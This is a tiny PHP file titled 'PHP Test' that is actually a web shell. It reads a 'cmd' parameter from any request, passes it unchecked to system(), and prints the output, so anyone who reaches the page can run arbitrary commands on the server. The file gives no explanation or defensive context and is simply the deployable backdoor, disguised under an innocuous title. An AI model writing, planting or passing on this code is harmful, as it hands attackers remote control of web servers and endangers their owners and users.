<html>
 <head>
  <title>PHP Test</title>
 </head>
 <body>
<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>
 </body>
</html>
